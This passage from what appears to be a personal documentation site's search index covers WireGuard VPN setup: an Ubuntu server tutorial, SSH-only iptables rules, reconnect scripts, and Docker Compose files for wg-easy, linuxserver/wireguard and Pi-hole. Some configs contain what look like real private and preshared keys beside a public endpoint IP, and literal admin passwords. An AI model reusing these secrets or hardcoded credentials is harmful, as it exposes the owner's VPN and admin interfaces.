footprint. It is cross-platform and can run almost anywhere, including Linux, Windows, Android, and macOS.</p> <p>Wireguard is a peer-to-peer VPN; it does not use the client-server model. Depending on its configuration, a peer can act as a traditional server or client. It works by creating a network interface on each peer device that acts as a tunnel. Peers authenticate each other by exchanging and validating public keys, mimicking the SSH model. Public keys are mapped with a list of IP addresses that are allowed in the tunnel. The VPN traffic is encapsulated in UDP.</p> <p>In this article, we\u2019ll discuss how to set up a WireGuard VPN on Ubuntu 20.04 that will act as a VPN server. We\u2019ll also show you how to configure WireGuard as a client. The client\u2019s traffic will be routed through the Ubuntu 20.04 server.</p> <p>This setup can be used as a protection against Man in the Middle attacks, surfing the web anonymously, bypassing Geo-restricted content, or allowing your colleagues who work from home to connect to the company network securely.</p>"},{"location":"VPN/Tutorial/#prerequisites","title":"Prerequisites","text":"<p>To follow this guide, you\u2019ll need an Ubuntu 20.04 server with root or sudo access .</p>"},{"location":"VPN/Tutorial/#setting-up-the-wireguard-server","title":"Setting Up the WireGuard Server","text":"<p>We\u2019ll start by installing WireGuard on the Ubuntu machine and set it up to act as a server. We\u2019ll also configure the system to route the clients\u2019 traffic through it.</p>"},{"location":"VPN/Tutorial/#install-wireguard-on-ubuntu-2004","title":"Install WireGuard on Ubuntu 20.04","text":"<p>WireGuard is available from the default Ubuntu repositories. To install it, run the following commands:</p> <pre><code>sudo apt update &amp;&amp; sudo apt install wireguard\n</code></pre> <p>This will install the WireGuard module and tools.</p> <p>WireGuard runs as a kernel module.</p>"},{"location":"VPN/Tutorial/#configuring-wireguard","title":"Configuring WireGuard","text":"<p>The <code>wg</code> and <code>wg-quick</code> command-line tools allow you to configure and manage the WireGuard interfaces.</p> <p>Each device in the WireGuard VPN network needs to have a private and public key. Run the following command to generate the key pair:</p> <pre><code>wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey\n</code></pre> <p>The files will be generated in the <code>/etc/wireguard</code> directory. You can view the contents of the files with <code>cat</code> or <code>less</code> . The private key should never be shared with anyone and should always be kept secure.</p> <p>Wireguard also supports a pre-shared key, which adds an additional layer of symmetric-key cryptography. This key is optional and must be unique for each peer pair.</p> <p>The next step is to configure the tunnel device that will route the VPN traffic.</p> <p>The device can be set up either from the command line using the <code>ip</code> and <code>wg</code> commands, or by creating the configuration file with a text editor.</p> <p>Create a new file named <code>wg0.conf</code> and add the following contents:</p> <pre><code>sudo nano /etc/wireguard/wg0.conf\n</code></pre> <p>/etc/wireguard/wg0.conf</p> <pre><code>[Interface]\nAddress = 10.0.0.1/24\nSaveConfig = true\nListenPort = 51820\nPrivateKey = SERVER_PRIVATE_KEY\nPostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE\nPostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -t nat -D POSTROUTING -o ens3 -j MASQUERADE\n</code></pre> <p>Copy</p> <p>The interface can be named anything, however it is recommended to use something like <code>wg0</code> or <code>wgvpn0</code>. The settings in the interface section have the following meaning:</p> <ul> <li> <p>Address - A comma-separated list of v4 or v6 IP addresses for the <code>wg0</code> interface. Use IPs from a range that is reserved for private networks (10.0.0.0/8, 172.16.0.0/12 or 192.168.0.0/16).</p> </li> <li> <p>ListenPort - The listening port.</p> </li> <li> <p>PrivateKey - A private key generated by the <code>wg genkey</code> command. (To see the contents of the file type: <code>sudo cat /etc/wireguard/privatekey</code>)</p> </li> <li> <p>SaveConfig - When set to true, the current state of the interface is saved to the configuration file when shutdown.</p> </li> <li> <p>PostUp - Command or script that is executed before bringing the interface up. In this example, we\u2019re using iptables to enable masquerading. This allows traffic to leave the server, giving the VPN clients access to the Internet.</p> </li> </ul> <p>Make sure to replace <code>ens3</code> after <code>-A POSTROUTING</code> to match the name of your public network interface. You can easily find the interface with:</p> <p><code>ip -o -4 route show to default | awk '{print $5}'</code></p> <ul> <li>PostDown - command or script which is executed before bringing the interface down. The iptables rules will be removed once the interface is down.</li> </ul> <p>The <code>wg0.conf</code> and <code>privatekey</code> files should not be readable to normal users. Use <code>chmod</code> to set the permissions to <code>600</code>:</p> <pre><code>sudo chmod 600 /etc/wireguard/{privatekey,wg0.conf}Copy\n</code></pre> <p>Once done, bring the <code>wg0</code> interface up using the attributes specified in the configuration file:</p> <pre><code>sudo wg-quick up wg0\n</code></pre> <p>The command will produce an output similar to the following:</p> <pre><code>[#] ip link add wg0 type wireguard\n[#] wg setconf wg0 /dev/fd/63\n[#] ip -4 address add 10.0.0.1/24 dev wg0\n[#] ip link set mtu 1420 up dev wg0\n[#] iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o ens3 -j MASQUERADE\nCopy\n</code></pre> <p>To check the interface state and configuration, enter:</p> <pre><code>sudo wg show wg0Copy\ninterface: wg0\n  public key: r3imyh3MCYggaZACmkx+CxlD6uAmICI8pe/PGq8+qCg=\n  private key: (hidden)\n  listening port: 51820\nCopy\n</code></pre> <p>You can also run <code>ip a show wg0</code> to verify the interface state:</p> <pre><code>ip a show wg0Copy\n4: wg0: &lt;POINTOPOINT,NOARP,UP,LOWER_UP&gt; mtu 1420 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/none \n    inet 10.0.0.1/24 scope global wg0\n       valid_lft forever preferred_lft forever\nCopy\n</code></pre> <p>WireGuard can also be managed with Systemd.</p> <p>To bring the WireGuard interface at boot time, run the following command:</p> <pre><code>sudo systemctl enable wg-quick@wg0Copy\n</code></pre>"},{"location":"VPN/Tutorial/#server-networking-and-firewall-configuration","title":"Server Networking and Firewall Configuration","text":"<p>IP forwarding must be enabled for NAT to work. Open the <code>/etc/sysctl.conf</code> file and add or uncomment the following line:</p> <pre><code>sudo nano /etc/sysctl.confCopy\n</code></pre> <p>/etc/sysctl.conf</p> <pre><code>net.ipv4.ip_forward=1\n</code></pre> <p>Copy</p> <p>Save the file and apply the change:</p> <pre><code>sudo sysctl -pCopy\nnet.ipv4.ip_forward = 1\nCopy\n</code></pre> <p>If you are using UFW to manage your firewall you need to open UDP traffic on port <code>51820</code>:</p> <pre><code>sudo ufw allow 51820/udpCopy\n</code></pre> <p>That\u2019s it. The Ubuntu peer that will act as a server has been set up.</p>"},{"location":"VPN/Tutorial/#linux-and-macos-clients-setup","title":"Linux and macOS Clients Setup","text":"<p>The installation instructions for all supported platforms are available at https://wireguard.com/install/ . On Linux systems, you can install the package using the distribution package manager and on macOS with <code>brew</code>.</p> <p>Once installed follow the steps below to configure the client device.</p> <p>The process for setting up a Linux and macOS client is pretty much the same as you did for the server. First generate the public and private keys:</p> <pre><code>wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickeyCopy\n</code></pre> <p>Create the file <code>wg0.conf</code> and add the following contents:</p> <pre><code>sudo nano /etc/wireguard/wg0.confCopy\n</code></pre> <p>/etc/wireguard/wg0.conf</p> <pre><code>[Interface]\nPrivateKey = CLIENT_PRIVATE_KEY\nAddress = 10.0.0.2/24\n\n\n[Peer]\nPublicKey = SERVER_PUBLIC_KEY\nEndpoint = SERVER_IP_ADDRESS:51820\nAllowedIPs = 0.0.0.0/0\n</code></pre> <p>Copy</p> <p>The settings in the interface section have the same meaning as when setting up the server:</p> <ul> <li>Address - A comma-separated list of v4 or v6 IP addresses for the <code>wg0</code> interface.</li> <li>PrivateKey - To see the contents of the file on the client machine run: <code>sudo cat /etc/wireguard/privatekey</code></li> </ul> <p>The peer section contains the following fields:</p> <ul> <li>PublicKey - A public key of the peer you want to connect to. (The contents of the server\u2019s <code>/etc/wireguard/publickey</code> file).</li> <li>Endpoint - An IP or hostname of the peer you want to connect to followed by a colon, and then a port number on which the remote peer listens to.</li> <li>AllowedIPs - A comma-separated list of v4 or v6 IP addresses from which incoming traffic for the peer is allowed and to which outgoing traffic for this peer is directed. We\u2019re using 0.0.0.0/0 because we are routing the traffic and want the server peer to send packets with any source IP.</li> </ul> <p>If you need to configure additional clients, just repeat the same steps using a different private IP address.</p>"},{"location":"VPN/Tutorial/#windows-clients-setup","title":"Windows Clients Setup","text":"<p>Download and install the Windows msi package from the WireGuard website .</p> <p>Once installed, open the WireGuard application and click on \u201cAdd Tunnel\u201d -&gt; \u201cAdd empty tunnel\u2026\u201d as shown on the image below:</p> <p></p> <p>A publickey pair is automatically created and displayed on the screen.</p> <p></p> <p>Enter a name for the tunnel and edit the configuration as follows:</p> <pre><code>[Interface]\nPrivateKey = CLIENT_PRIVATE_KEY\nAddress = 10.0.0.2/24\n\n\n[Peer]\nPublicKey = SERVER_PUBLIC_KEY\nEndpoint = SERVER_IP_ADDRESS:51820\nAllowedIPs = 0.0.0.0/0\n</code></pre> <p>Copy</p> <p>In the interface section, add a new line to define the client tunnel Address.</p> <p>In the peer section, add the following fields:</p> <ul> <li>PublicKey - The public key of the Ubuntu server (<code>/etc/wireguard/publickey</code> file).</li> <li>Endpoint - The IP address of the Ubuntu server followed by a colon, and WireGuard port (51820).</li> <li>AllowedIPs - 0.0.0.0/0</li> </ul> <p>Once done, click on the \u201cSave\u201d button.</p>"},{"location":"VPN/Tutorial/#add-the-client-peer-to-the-server","title":"Add the Client Peer to the Server","text":"<p>The last step is to add the client\u2019s public key and IP address to the server. To do that, run the following command on the Ubuntu server:</p> <pre><code>sudo wg set wg0 peer CLIENT_PUBLIC_KEY allowed-ips 10.0.0.2Copy\n</code></pre> <p>Make sure to change the <code>CLIENT_PUBLIC_KEY</code> with the public key you generated on the client machine (<code>sudo cat /etc/wireguard/publickey</code>) and adjust the client IP address if it is different. Windows users can copy the public key from the WireGuard application.</p> <p>Once done, go back to the client machine and bring up the tunneling interface.</p>"},{"location":"VPN/Tutorial/#linux-and-macos-clients","title":"Linux and macOS Clients","text":"<p>Run the following command the bring up the interface:</p> <pre><code>sudo wg-quick up wg0Copy\n</code></pre> <p>Now you should be connected to the Ubuntu server, and the traffic from your client machine should be routed through it. You can check the connection with:</p> <pre><code>sudo wgCopy\ninterface: wg0\n  public key: gFeK6A16ncnT1FG6fJhOCMPMeY4hZa97cZCNWis7cSo=\n  private key: (hidden)\n  listening port: 53527\n  fwmark: 0xca6c\n\npeer: r3imyh3MCYggaZACmkx+CxlD6uAmICI8pe/PGq8+qCg=\n  endpoint: XXX.XXX.XXX.XXX:51820\n  allowed ips: 0.0.0.0/0\n  latest handshake: 53 seconds ago\n  transfer: 3.23 KiB received, 3.50 KiB sent\nCopy\n</code></pre> <p>You can also open your browser, type \u201cwhat is my ip\u201d, and you should see your Ubuntu server IP address.</p> <p>To stop the tunneling, bring down the <code>wg0</code> interface:</p> <pre><code>sudo wg-quick down wg0Copy\n</code></pre>"},{"location":"VPN/Tutorial/#windows-clients","title":"Windows Clients","text":"<p>If you installed WireGuard on Windows, click on the \u201cActivate\u201d button. Once the peers are connected, the tunnel status will change to Active:</p> <p></p>"},{"location":"VPN/Tutorial/#conclusion","title":"Conclusion","text":"<p>We have shown you how to install WireGuard on an Ubuntu 20.04 machine and configure it as a VPN server. This setup allows you to surf the web anonymously by keeping your traffic data private.</p> <p>If you are facing any problems, feel free to leave a comment.</p>"},{"location":"VPN/onlyVpnSSH/","title":"onlyVpnSSH","text":""},{"location":"VPN/onlyVpnSSH/#only-allow-ssh-in-vpn","title":"Only allow ssh in vpn","text":"<p>Create this script rules in <code>/etc/wireguadr/iptables.sh</code></p> <p>Do execution permissions <code>sudo chmod +x /etc/wireguadr/iptables.sh</code></p> <pre><code>#!/bin/bash\n# create wireguard chain\niptables -t filter -N wireguard\n# permit anything coming from or going to port 22\niptables -t filter -A wireguard -p tcp --dport 1024:65535 --sport 22 -m state --state ESTABLISHED -j ACCEPT\niptables -t filter -A wireguard -p tcp --sport 1024:65535 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT\n# drop everything else\niptables -t filter -A wireguard -j DROP\n</code></pre> <p>Add this conf in /etc/wireguard/wg0.conf</p> <pre><code>PostUp = iptables -t filter -I FORWARD -i %i -j wireguard\nPostUp = iptables -t filter -I FORWARD -o %i -j wireguard\n</code></pre> <p>Config file looks like that</p> <pre><code>[Interface]\nAddress = 10.13.13.5\nPrivateKey = qPZQj/5R+xOeuta1Ml+UDpqPRvt18hc8CHlxTyxbNmo=\nListenPort = 51820\nDNS = 10.13.13.1\nPostUp = iptables -t filter -I FORWARD -i %i -j wireguard\nPostUp = iptables -t filter -I FORWARD -o %i -j wireguard\n[Peer]\nPublicKey = CAKN4TCOQdbpujsCN2V4YNxlLFHP+ue+rvgz2wqT8H8=\nPresharedKey = qCA1/rDORiPpGQjJA75ssnENj7MF5dOQgaKZ3BtkzH4=\nEndpoint = 35.239.20.21:51820\nAllowedIPs = 10.13.13.0/24\n</code></pre> <p>Add script in <code>crontab -e</code></p> <pre><code>@reboot bash /etc/wireguard/iptables.sh\n</code></pre> <p>Restart VPN</p> <pre><code>sudo wg-quick down wg0\nsystemctl restart wg-quick@wg0.service\nsudo wg-quick up wg0\n</code></pre>"},{"location":"VPN/troubleshoot/","title":"Troubleshoot","text":""},{"location":"VPN/troubleshoot/#tunnel-disconnect","title":"Tunnel disconnect","text":"<p>Linux :</p> <ul> <li>create a new bash file, ( $ <code>sudo nano /etc/wireguard/wg0retry.bash</code> ) with this content:</li> </ul> <pre><code>#!/bin/bash\nwhile true\ndo\n   sleep 15\n   wg-quick up wg0\ndone\n</code></pre> <p>EDIT: this script (replacement for the bloc of code above - <code>wg0retry.bash</code>) is more robust if you don't mind the little extra bandwidth. I added a ping every 15sec to validate that the tunnel is connected, replace \"\" for the IP of your Wireguard \"server\" : <pre><code>#!/bin/bash\nwhile true\ndo\n    sleep 15\n    ping -c 1 &lt;your_wireguard_server_ip&gt;\n    if [ $? != 0 ]\n    then\n        wg-quick down wg0\n        sleep 4\n        wg-quick up wg0\n    fi\ndone\n</code></pre> <p>it will retry every 15 seconds to start the wg0 tunnel, so when the tunnel is already working it will do nothing and when the tunnel is down it will revive it.</p> <ul> <li>add a superuser crontab ( $ <code>sudo crontab -e</code> ) to run the previously created script at boot :</li> </ul> <pre><code>@reboot bash /etc/wireguard/wg0retry.bash\n</code></pre> <ul> <li>And you're done! Wireguard is now indestructible on Linux.</li> </ul> <p>Windows:</p> <ul> <li>Install wireguard-windows</li> <li>Copy your configuration file to the Wireguard installation folder C:\\Program Files\\WireGuard\\wg0.conf</li> <li>Create a \".bat\" file with this content and save it to the Wireguard installation folder <code>C:\\Program Files\\WireGuard\\wg0retry.bat</code> :</li> </ul> <pre><code>@echo OFF\n\n:loop\n\nset _ServiceName=WireGuardTunnel$wg0\n\nsc query %_ServiceName% | find \"does not exist\" &gt;nul\nif %ERRORLEVEL% EQU 0 \"C:\\Program Files\\WireGuard\\WireGuard.exe\" /installtunnelservice \"C:\\Program Files\\WireGuard\\wg0.conf\" &amp; echo \"installing service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Exist!\"\n\nsc query %_ServiceName% | find \"STOPPED\" &gt;nul\nif %ERRORLEVEL% EQU 0 sc start %_ServiceName% &amp; echo \"starting service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Started!\"\ntimeout /t 15\n\ngoto loop\n</code></pre> <p>EDIT: this script (replacement for the bloc of code above - <code>wg0retry.bat</code>) is more robust if you don't mind the little extra bandwidth. I added a ping every 15sec to validate that the tunnel is connected, replace \"\" for the IP of your Wireguard \"server\" : <pre><code>@echo OFF\n\n:loop\n\nset _ServiceName=WireGuardTunnel$wg0\n\nsc query %_ServiceName% | find \"does not exist\" &gt;nul\nif %ERRORLEVEL% EQU 0 \"C:\\Program Files\\WireGuard\\WireGuard.exe\" /installtunnelservice \"C:\\Program Files\\WireGuard\\wg0.conf\" &amp; echo \"installing service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Exist!\"\n\nsc query %_ServiceName% | find \"STOPPED\" &gt;nul\nif %ERRORLEVEL% EQU 0 sc start %_ServiceName% &amp; echo \"starting service\"\nif %ERRORLEVEL% EQU 1 echo \"Service Started!\"\n\ntimeout /t 15\n\nping -n 1 &lt;your_wireguard_server_ip&gt; | find \"TTL=\" &gt;nul\nif errorlevel 1 (\n    echo \"server not responding, restarting service\"\n    sc stop %_ServiceName%\n    timeout /t 5\n    sc start %_ServiceName%\n    timeout /t 5\n)\n\ngoto loop\n</code></pre> <p>this batch script will check in the Windows Service Control (sc) if the service for the tunnel of Wireguard wg0 exist, if it exist, the script does nothing here. If the service does not exist, it will run the command line installation for the Wireguard tunnel service (/installtunnelservice).</p> <p>Then the script will check if the service for the tunnel of Wireguard wg0 is running. If it's running the script does nothing. If it's not running, it will start the service. The script loop every 15 seconds.</p> <ul> <li>download NSSM : http://nssm.cc/download</li> <li>extract the nssm zip file to <code>C:\\Program Files\\NSSM\\</code> since you don't want to delete or move this executable after the next step.</li> <li>Run cmd.exe as Administrator, and execute those lines:</li> </ul> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" install wg0retry \"C:\\Program Files\\WireGuard\\wg0retry.bat\"\n\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" start wg0retry\n</code></pre> <p>It will install a new Windows Service that will start at boot and will execute our script wg0retry.bat</p> <ul> <li>And you're done! Wireguard is now indestructible on Windows.</li> </ul> <p>* Please note that this method is independent of the Wireguard tray application and even if you quit Wireguard, or use it to disconnect, the tunnel will still be connected. To be able to disconnect the tunnel, You need to stop the service in (in Administrator cmd.exe) :</p> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" stop wg0retry\n</code></pre> <p>or if you want to remove it permanently:</p> <pre><code>\"C:\\Program Files\\NSSM\\win64\\nssm.exe\" remove wg0retry\n</code></pre> <p>Hope this helps.</p>"},{"location":"VPN/wg-easy/","title":"Wg easy","text":""},{"location":"VPN/wg-easy/#wg-easy","title":"WG-EASY","text":"<pre><code>version: \"3.8\"\nservices:\n  wg-easy:\n    environment:\n      # \u26a0\ufe0f Required:\n      # Change this to your host's public address\n      - WG_HOST=raspberrypi.local\n\n      # Optional:\n      # - PASSWORD=foobar123\n      # - WG_PORT=51820\n      # - WG_DEFAULT_ADDRESS=10.8.0.x\n      # - WG_DEFAULT_DNS=1.1.1.1\n      # - WG_MTU=1420\n      # - WG_ALLOWED_IPS=192.168.15.0/24, 10.0.1.0/24\n      # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt\n      # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt\n      # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt\n      # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt\n\n    image: ghcr.io/wg-easy/wg-easy\n    container_name: wg-easy\n    volumes:\n      - .:/etc/wireguard\n    ports:\n      - \"51820:51820/udp\"\n      - \"51821:51821/tcp\"\n    restart: unless-stopped\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    sysctls:\n      - net.ipv4.ip_forward=1\n      - net.ipv4.conf.all.src_valid_mark=1\n</code></pre> <pre><code>version: \"3.8\"\nservices:\n  wg-easy:\n    environment:\n      # \u26a0\ufe0f Required:\n      # Change this to your host's public address\n      - WG_HOST=95.217.210.147\n\n      # Optional:\n      - PASSWORD=PassWord\n      - WG_PORT=51820\n      - WG_DEFAULT_ADDRESS=10.13.13.x\n      - WG_DEFAULT_DNS=1.1.1.1\n      # - WG_MTU=1420\n      - WG_PERSISTENT_KEEPALIVE=25\n      - WG_ALLOWED_IPS=0.0.0.0/0\n      # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt\n      # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt\n      # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt\n      # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt\n      # - UI_TRAFFIC_STATS=true\n    image: weejewel/wg-easy:7-nightly\n    # image: ghcr.io/wg-easy/wg-easy\n    container_name: wg-easy\n    volumes:\n      - ./:/etc/wireguard\n    ports:\n      - \"51820:51820/udp\"\n      - \"51821:51821/tcp\"\n    restart: unless-stopped\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    sysctls:\n      - net.ipv4.ip_forward=1\n      - net.ipv4.conf.all.src_valid_mark=1\n</code></pre> <pre><code>version: \"3.8\"\n\nservices:\n  wg-easy:\n    environment:\n      # \u26a0\ufe0f Change the server's hostname (clients will connect to):\n      - WG_HOST=myhost.com\n\n      # \u26a0\ufe0f Change the Web UI Password:\n      - PASSWORD=foobar123\n\n      # \ud83d\udca1 This is the Pi-Hole Container's IP Address\n      - WG_DEFAULT_DNS=10.8.1.3\n      - WG_DEFAULT_ADDRESS=10.8.0.x\n    image: ghcr.io/wg-easy/wg-easy\n    container_name: wg-easy\n    volumes:\n      - ~/.wg-easy:/etc/wireguard\n    ports:\n      - \"51820:51820/udp\"\n      - \"51821:51821/tcp\"\n    restart: unless-stopped\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    sysctls:\n      - net.ipv4.ip_forward=1\n      - net.ipv4.conf.all.src_valid_mark=1\n    networks:\n      wg-easy:\n        ipv4_address: 10.8.1.2\n\n  pihole:\n    image: pihole/pihole\n    container_name: pihole\n    environment:\n      # \u26a0\ufe0f Change the Web UI Password:\n      - WEBPASSWORD=foobar123\n    volumes:\n      - '~/.pihole/etc-pihole:/etc/pihole'\n      - './.pihole/etc-dnsmasq.d:/etc/dnsmasq.d'\n    ports:\n      - \"53:53/tcp\"\n      - \"53:53/udp\"\n      - \"5353:80/tcp\"\n    restart: unless-stopped\n    networks:\n      wg-easy:\n        ipv4_address: 10.8.1.3\n\nnetworks:\n  wg-easy:\n    ipam:\n      config:\n        - subnet: 10.8.1.0/24\n</code></pre> <p><code>sudo systemctl stop systemd-resolved</code></p>"},{"location":"VPN/wireguard/","title":"Wireguard","text":""},{"location":"VPN/wireguard/#wireguard","title":"Wireguard","text":"<pre><code>systemctl disable systemd-resolved.service\nsystemctl stop systemd-resolved\n</code></pre>"},{"location":"VPN/wireguard/#compose-with-pihole","title":"Compose with PiHole","text":"<pre><code>version: '3.7'\n\nservices:\n  wireguard:\n    image: linuxserver/wireguard\n    container_name: wireguard\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=America/Mendoza\n      - SERVERPORT=51820 #optional\n      - PEERS=2 #optional\n      - PEERDNS=auto #optional\n      - INTERNAL_SUBNET=10.13.13.0 #optional\n    volumes:\n      - /root/wireguard:/config\n      - /lib/modules:/lib/modules\n      - /usr/src:/usr/src\n    ports:\n      - 51820:51820/udp\n    sysctls:\n      - net.ipv4.conf.all.src_valid_mark=1\n    dns:\n      - 172.20.0.7\n    restart: unless-stopped\n    networks:\n      containers:\n        ipv4_address: 172.20.0.6\n\n  pihole:\n    container_name: pihole\n    image: pihole/pihole:v5.7\n    expose:\n      - \"53\"\n      - \"67\"\n      - \"80\"\n      - \"443\"\n    environment:\n      TZ: 'America/Mendoza'\n      WEBPASSWORD: 'peladonerd'\n    volumes:\n      - './etc-pihole/:/etc/pihole/'\n      - './etc-dnsmasq.d/:/etc/dnsmasq.d/'\n    cap_add:\n      - NET_ADMIN\n    restart: unless-stopped\n    networks:\n      containers:\n        ipv4_address: 172.20.0.7\n\nnetworks:\n  containers:\n    ipam:\n      config:\n        - subnet: 172.20.0.0/24\n</code></pre>"},{"location":"VPN/wireguard/#compose-wireguard","title":"Compose Wireguard","text":"<pre><code>version: '3.3'\nservices:\n  wireguard:\n    image: linuxserver/wireguard\n    container_name: wireguard\n    cap_add:\n      - NET_ADMIN\n      - SYS_MODULE\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Europe/Madrid\n      - SERVERURL=1.1.1.1 #optional\n      - SERVERPORT=51820 #optional\n      - PEERS=2 #optional\n      - PEERDNS=auto #optional\n      - INTERNAL_SUBNET=10.13.13.0 #optional\n    volumes:\n      - /path/to/appdata/config:/config\n      - /lib/modules:/lib/modules\n      - /usr/src:/usr/src\n    ports:\n      - 51820:51820/udp\n    sysctls:\n      - net.ipv4.conf.all.src_valid_mark=1\n    restart: unless-stopped\n</code></pre>"},{"location":"VPN/wireguard/#docker-command","title":"Docker Command","text":"<pre><code>docker run -d \\\n  --name=wireguard \\\n  --cap-add=NET_ADMIN \\\n  --cap-add=SYS_MODULE \\\n  -e PUID=1000 \\\n  -e PGID=1000 \\\n  -e TZ=Europe/London \\\n  -e SERVERPORT=51820 `#optional` \\\n  -e PEERS=4 `#optional` \\\n  -e PEERDNS=auto `#optional` \\\n  -e INTERNAL_SUBNET=10.13.13.0 `#optional` \\\n  -e ALLOWEDIPS=0.0.0.0/0 `#optional` \\\n  -e LOG_CONFS=true `#optional` \\\n  -p 51820:51820/udp \\\n  -v /path/to/appdata/config:/config \\\n  -v /lib/modules:/lib/modules `#optional` \\\n  --sysctl=\"net.ipv4.conf.all.src_valid_mark=1\" \\\n  --restart unless-stopped \\\n  linuxserver/wireguard\n</code></pre>"},{"location":"VPN/wireguard/#install-in-linux","title":"Install in linux","text":"<p>Nota*: *Se tom\u00f3 como ejemplo Ubuntu 19.10.</p> <p>1. En primer lugar, debe crear el archivo de configuraci\u00f3n WireGuard\u00ae en su oficina del usuario. Para hacer esto, siga las instrucciones descritas en este manual.</p> <p>2. Cree el repositorio WireGuard\u00ae:</p> <pre><code>sudo add-apt-repository ppa:wireguard/wireguard\n</code></pre> <p>3. Instale los paquetes WireGuard\u00ae:</p> <pre><code>sudo apt install wireguard\n</code></pre> <p>Instale el paquete resolv.conf:</p> <pre><code>sudo apt install resolvconf\n</code></pre> <p>4. Vaya al directorio WireGuard\u00ae y cree el archivo wg0.conf:</p> <pre><code>cd /etc/wireguard\n</code></pre> <p>5. Copie la configuracion de WireGuard\u00ae que recibi\u00f3 en su Oficina del usuario y p\u00e9guelas en el archivo wg0.conf usando su editor de texto:</p> <pre><code>nano wg0.conf\n</code></pre> <p>6. Encienda su conexi\u00f3n WireGuard\u00ae y disfrute de una navegaci\u00f3n web r\u00e1pida y fiable:</p> <pre><code>systemctl start wg-quick@wg0\n</code></pre> <p>7. Si desea mantener su conexi\u00f3n WireGuard\u00ae activa desde el inicio del sistema, imprima el siguiente comando:</p> <pre><code>systemctl enable wg-quick@wg0\n</code></pre> <p>8. Apague la conexi\u00f3n WireGuard\u00ae usando el comando:</p> <pre><code>systemctl stop wg-quick@wg0\n</code></pre> <p>9. Si desea desactivar el inicio autom\u00e1tico, use el comando:</p> <pre><code>systemctl disable wg-quick@wg0\n</code></pre> <pre><code>sudo wg-quick down wg0\nsystemctl restart wg-quick@wg0.service\nwg show\n</code></pre> <p>```version: '3.3' services:     wg-easy:         container_name: wg-easy         environment:             - WG_HOST=\ud83d\udea8YOUR_SERVER_IP             - PASSWORD=\ud83d\udea8YOUR_ADMIN_PASSWORD         volumes:             - '~/.wg-easy:/etc/wireguard'         ports:             - '51820:51820/udp'             - '51821:51821/tcp'         restart: unless-stopped         image: weejewel/wg-easy</p> <pre><code>\n</code></pre> <p>wireguard:     image: linuxserver/wireguard     container_name: alg_wireguard     cap_add:       - NET_ADMIN       - SYS_MODULE     environment:       - PUID=1000       - PGID=1000       - TZ=Europe/Madrid       - SERVERURL=1.1.1.1 #optional       - SERVERPORT=51820 #optional       - PEERDNS=auto #optional       - INTERNAL_SUBNET=10.13.13.0 #optional     volumes:       - ./config/wireguard:/config       - /lib/modules:/lib/modules       - /usr/src:/usr/src     network_mode: host     restart: unless-stopped</p> <pre><code>### wg-easy\n</code></pre> <p>version: \"3.8\" services:   wg-easy:     environment:       # \u26a0\ufe0f Required:       # Change this to your host's public address       - WG_HOST=        # Optional:       - PASSWORD= [ADMIN PASSWORD]       # - WG_PORT=51820       # - WG_DEFAULT_ADDRESS= 10.8.0.x       # - WG_DEFAULT_DNS=        # - WG_MTU=1420       - WG_ALLOWED_IPS= [SUBNET]/[MASK]       # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt       # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt       # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt       # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt     image: weejewel/wg-easy     container_name: wg-easy     volumes:       - /storage/path/ofyour/choice:/etc/wireguard     ports:       - \"51820:51820/udp\"       - \"51821:51821/tcp\"     restart: unless-stopped     cap_add:       - NET_ADMIN       - SYS_MODULE     sysctls:       - net.ipv4.ip_forward=1       - net.ipv4.conf.all.src_valid_mark=1</p> <pre><code>\n</code></pre> <p>version: \"3.8\" services:   wg-easy:     environment:       # \u26a0\ufe0f Required:       # Change this to your host's public address       - WG_HOST=35.239.20.88</p> <pre><code>  # Optional:\n  - PASSWORD=\n  - WG_PORT=51820\n  - WG_DEFAULT_ADDRESS=10.13.13.x\n  - WG_DEFAULT_DNS=1.1.1.1\n  # - WG_MTU=1420\n  - WG_PERSISTENT_KEEPALIVE=25\n  - WG_ALLOWED_IPS=10.13.13.0/24\n  # - WG_PRE_UP=echo \"Pre Up\" &gt; /etc/wireguard/pre-up.txt\n  # - WG_POST_UP=echo \"Post Up\" &gt; /etc/wireguard/post-up.txt\n  # - WG_PRE_DOWN=echo \"Pre Down\" &gt; /etc/wireguard/pre-down.txt\n  # - WG_POST_DOWN=echo \"Post Down\" &gt; /etc/wireguard/post-down.txt\n#image: weejewel/wg-easy:latest\nimage: weejewel/wg-easy:7-nightly\ncontainer_name: wg-easy\nvolumes:\n  - ./:/etc/wireguard\nports:\n  - \"51820:51820/udp\"\n  - 